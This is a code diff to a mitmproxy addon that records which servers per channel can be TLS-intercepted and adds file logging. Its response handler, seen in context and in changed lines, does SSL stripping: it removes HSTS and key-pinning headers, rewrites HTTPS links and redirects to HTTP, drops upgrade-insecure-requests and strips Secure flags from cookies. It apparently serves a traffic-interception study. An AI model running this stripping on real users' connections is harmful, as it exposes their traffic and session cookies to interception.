@@ -1,17 +1,19 @@
 import collections
 import redis
-import random
+import time
 import re
-import os
 import urllib.parse
 import typing  # noqa
 import mitmproxy
+import logging
 
 from enum import Enum
 from mitmproxy import ctx
 from mitmproxy.exceptions import TlsProtocolException
 from mitmproxy.proxy.protocol import TlsLayer, RawTCPLayer
 from mitmproxy import http
+
+
 
 class InterceptionResult(Enum):
     success = True
@@ -38,6 +40,12 @@ class _TlsStrategy:
         if hostname and hostname in self.rName2IPDic:
             IPList = IPList.union(self.rName2IPDic.get(hostname))
         return list(IPList)
+    def getAssociatedDomain(self, IPAddress):
+        hostname = ""
+        IPList = set([str(IPAddress)])
+        if IPAddress in self.rIP2NameDic:
+            hostname = self.rIP2NameDic.get(IPAddress)
+        return hostname
 
 
     def should_intercept(self, server_address):
@@ -52,6 +60,9 @@ class _TlsStrategy:
         self.history[server_address].append(InterceptionResult.success)
         with open(mitmableFileName, 'a') as the_file:
             the_file.write("\"%s\":%s\n" % (str(channel_id), str(server_address)))
+            hostname = self.getAssociatedDomain(str(server_address[0]))
+            if hostname:
+                server_address[0] = hostname
             mitmable.add(server_address)
 
     def record_failure(self, server_address):
@@ -60,10 +71,15 @@ class _TlsStrategy:
         for server in serverList:
             server_address_tuple = (server, portNum)
             self.history[server_address_tuple].append(InterceptionResult.failure)
-            with open(unMitmableFileName, 'a') as the_file:
-                the_file.write("\"%s\":%s\n" % (str(channel_id), str(server_address_tuple)))
-                unMitmable.add(server_address_tuple)
-                #the_file.write(str(server_address)+":" + str(tls_strategy.should_intercept(server_address)) +'\n')
+            unMitmable.add(server_address_tuple)
+
+        with open(unMitmableFileName, 'a') as the_file:
+            hostname = self.getAssociatedDomain(str(server_address[0]))
+            if hostname:
+                server_address[0] = hostname
+            the_file.write("\"%s\":%s\n" % (str(channel_id), str(server_address)))
+
+            #the_file.write(str(server_address)+":" + str(tls_strategy.should_intercept(server_address)) +'\n')
 
     def record_skipped(self, server_address):
         self.history[server_address].append(InterceptionResult.skipped)
@@ -136,8 +152,15 @@ def configure(updated):
     tls_strategy = ConservativeStrategy()
     channel_id = ctx.options.channel_id
     data_dir = ctx.options.data_dir
-    mitmableFileName = str(data_dir) + "/mitmlog/" + str(channel_id) + '.mitmable'
-    unMitmableFileName = str(data_dir) + "/mitmlog/" + str(channel_id) + '.unmitmable'
+
+    base_filename = '{}-{}'.format(
+        channel_id,
+        int(time.time())
+    )
+    mitmableFileName = str(data_dir) + "/mitmlog/" + str(base_filename) + '.mitmable'
+    unMitmableFileName = str(data_dir) + "/mitmlog/" + str(base_filename) + '.unmitmable'
+    LOG_FILE = str(data_dir) + "/mitmlog/" + str(base_filename) + '.stripdown'
+    logging.basicConfig(filename=LOG_FILE,level=logging.DEBUG)
 
 
 def next_layer(next_layer):
@@ -199,16 +222,19 @@ def response(flow: http.HTTPFlow) -> None:
     #mitmproxy.ctx.log(
     #    "Response: %s" % repr(flow.response.content),
     #    "debug")
-    if flow.response.headers.pop('Strict-Transport-Security', None) or flow.response.headers.pop('Public-Key-Pins', None):
-        mitmproxy.ctx.log(
-            "Removing headers Strict-Transport-Security and Public-Key-Pins for %s:%s" % (repr(flow.response.host), repr(flow.response.port)),
-            "warn")
+    if flow.response.headers.pop('Strict-Transport-Security', None):
+        #mitmproxy.ctx.log(
+        logging.info(
+            "Removing header Strict-Transport-Security for %s %s:%s" % (repr(flow.response), repr(flow.response.host), repr(flow.response.port)))
+    if flow.response.headers.pop('Public-Key-Pins', None):
+        logging.info(
+            "Removing header Public-Key-Pins for %s %s:%s" % (repr(flow.response), repr(flow.response.host), repr(flow.response.port)))
+
 
     # strip links in response body
     if b'https://' in flow.response.content:
-        mitmproxy.ctx.log(
-            "Replacing content: %s" % flow.response.content,
-            "debug")
+        logging.info(
+            "Replacing content: %s" % repr(flow.response.content))
     flow.response.content = flow.response.content.replace(b'https://', b'http://')
 
     # strip meta tag upgrade-insecure-requests in response body
@@ -221,15 +247,24 @@ def response(flow: http.HTTPFlow) -> None:
         hostname = urllib.parse.urlparse(location).hostname
         if hostname:
             secure_hosts.add(hostname)
+            logging.info(
+            "Secure Host added: %s" % hostname)
         flow.response.headers['Location'] = location.replace('https://', 'http://', 1)
 
     # strip upgrade-insecure-requests in Content-Security-Policy header
     if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
+        logging.info(
+            "upgrade-insecure-requests: %s" % repr(flow.response.headers.get('Content-Security-Policy', '')))
         csp = flow.response.headers['Content-Security-Policy']
         flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)
         mitmproxy.ctx.log("Removing upgrade-insecure-requests for %s:%s" % (repr(flow.response.host),repr(flow.response.port)), "warn")
 
     # strip secure flag from 'Set-Cookie' headers
     cookies = flow.response.headers.get_all('Set-Cookie')
+    if cookies:
+        for s in cookies:
+            if "secure" in s:
+                logging.info("Stripping Secure Cookie: %s" % repr(s))
     cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
     flow.response.headers.set_all('Set-Cookie', cookies)
+
